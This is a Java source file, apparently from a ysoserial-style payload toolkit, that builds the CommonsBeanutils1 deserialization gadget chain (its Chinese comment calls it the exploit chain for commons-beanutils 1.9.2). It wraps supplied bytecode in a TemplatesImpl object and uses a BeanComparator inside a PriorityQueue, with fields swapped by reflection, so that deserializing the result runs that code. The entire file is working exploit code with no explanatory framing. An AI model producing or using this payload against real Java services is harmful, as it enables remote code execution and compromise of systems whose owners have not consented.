package payloads;


import java.math.BigInteger;
import java.util.PriorityQueue;

import org.apache.commons.beanutils.BeanComparator;
import payloads.util.Gadgets;
import payloads.util.Reflections;

// cb 1.9.2 版本的利用链
@SuppressWarnings({ "rawtypes", "unchecked" })
public class CommonsBeanutils1  {
    public Object getObject(byte[] bytes) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl(bytes);
        final BeanComparator comparator = new BeanComparator("lowestSetBit");

        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));

        // switch method called by comparator
        Reflections.setFieldValue(comparator, "property", "outputProperties");

        // switch contents of queue
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = templates;

        return queue;
    }
}

